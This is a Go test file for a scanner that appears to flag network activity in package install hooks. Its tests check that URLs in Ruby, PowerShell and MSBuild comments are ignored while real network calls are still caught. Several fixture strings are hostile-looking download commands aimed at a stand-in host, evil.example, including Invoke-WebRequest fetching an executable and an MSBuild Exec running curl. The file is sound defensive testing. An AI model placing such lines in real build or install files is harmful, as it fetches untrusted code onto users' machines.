package installsurface

import "testing"

// D-153 closed the C-family comment class (build.rs, referenced JS/py) but left
// Ruby, NuGet PowerShell, and MSBuild XML scanning raw, so a documentation URL
// or license header in one read as CapNetwork. These tests are the two-sided
// D-153 discipline for the three newly-stripped grammars: a marker in a comment
// no longer fires, AND a real capability in code still does (the over-correction
// guard — the strip must not swallow behavior).

func surfaceHasNetwork(s Surface) bool {
	for _, h := range s.Hooks {
		if h.HasCap(CapNetwork) {
			return true
		}
	}
	return false
}

func surfaceRemoteArtifacts(s Surface) int {
	n := 0
	for _, h := range s.Hooks {
		for _, a := range h.Artifacts {
			if a.Remote {
				n++
			}
		}
	}
	return n
}

func TestRubyCommentedMarkerIsNotNetwork(t *testing.T) {
	cases := map[string]string{
		"hash line comment": "require 'mkmf'\n" +
			"# downloads prebuilt binaries from https://cdn.example.com at build\n" +
			"create_makefile('x')\n",
		"trailing hash comment": "require 'mkmf' # see https://docs.example.com/net\n" +
			"create_makefile('x')\n",
		"=begin/=end block": "=begin\nInstalls via Net::HTTP.get from https://evil.example\n=end\n" +
			"require 'mkmf'\ncreate_makefile('x')\n",
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			s := AnalyzeRuby(src, "", "")
			if surfaceHasNetwork(s) {
				t.Errorf("a URL/marker in a Ruby comment must not read as CapNetwork")
			}
			if surfaceRemoteArtifacts(s) != 0 {
				t.Errorf("a URL in a Ruby comment must not become a remote artifact")
			}
		})
	}
}

func TestRubyRealNetworkStillDetected(t *testing.T) {
	// The over-correction guard: real behavior in code must survive stripping.
	src := "require 'net/http'\n" +
		"Net::HTTP.get(URI('https://evil.example/x'))\n" +
		"require 'mkmf'\ncreate_makefile('x')\n"
	s := AnalyzeRuby(src, "", "")
	if !surfaceHasNetwork(s) {
		t.Errorf("a real Net::HTTP call must still read as CapNetwork after stripping")
	}
	if surfaceRemoteArtifacts(s) == 0 {
		t.Errorf("a real outbound URL must still become a remote artifact")
	}
}

func TestRubyInterpolationNotEatenAsComment(t *testing.T) {
	// `#{...}` is interpolation, not a comment: a URL inside it must survive.
	src := "system(\"curl #{ENV['BASE']}https://evil.example/x\")\n" +
		"require 'mkmf'\ncreate_makefile('x')\n"
	s := AnalyzeRuby(src, "", "")
	if !surfaceHasNetwork(s) {
		t.Errorf("a URL beside Ruby #{} interpolation must not be stripped as a comment")
	}
}

func TestPowerShellCommentedMarkerIsNotNetwork(t *testing.T) {
	cases := map[string]string{
		"hash line comment":   "# Invoke-WebRequest https://doc.example/setup\nWrite-Host hi\n",
		"block comment <# #>": "<#\nInvoke-WebRequest https://doc.example\nDownloadString\n#>\nWrite-Host hi\n",
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			s := AnalyzeDotNet(map[string]string{"install.ps1": src})
			if surfaceHasNetwork(s) {
				t.Errorf("a marker in a PowerShell comment must not read as CapNetwork")
			}
		})
	}
}

func TestPowerShellRealNetworkStillDetected(t *testing.T) {
	src := "Invoke-WebRequest -Uri https://evil.example/x -OutFile p.exe\n"
	s := AnalyzeDotNet(map[string]string{"install.ps1": src})
	if !surfaceHasNetwork(s) {
		t.Errorf("a real Invoke-WebRequest must still read as CapNetwork after stripping")
	}
}

func TestMSBuildCommentedMarkerIsNotNetwork(t *testing.T) {
	src := "<Project>\n<!-- <Exec Command=\"curl https://evil.example/x\" /> -->\n" +
		"<Target Name=\"Build\"><Message Text=\"ok\" /></Target>\n</Project>\n"
	s := AnalyzeMSBuild(map[string]string{"build/x.targets": src})
	if surfaceHasNetwork(s) {
		t.Errorf("a curl inside an XML comment must not read as CapNetwork")
	}
	if surfaceRemoteArtifacts(s) != 0 {
		t.Errorf("a URL inside an XML comment must not become a remote artifact")
	}
}

func TestMSBuildRealNetworkStillDetected(t *testing.T) {
	src := "<Project><Target Name=\"Build\">\n" +
		"<Exec Command=\"curl https://evil.example/x\" />\n</Target></Project>\n"
	s := AnalyzeMSBuild(map[string]string{"build/x.targets": src})
	if !surfaceHasNetwork(s) {
		t.Errorf("a real <Exec curl> must still read as CapNetwork after stripping")
	}
	if surfaceRemoteArtifacts(s) == 0 {
		t.Errorf("a real outbound URL must still become a remote artifact")
	}
}
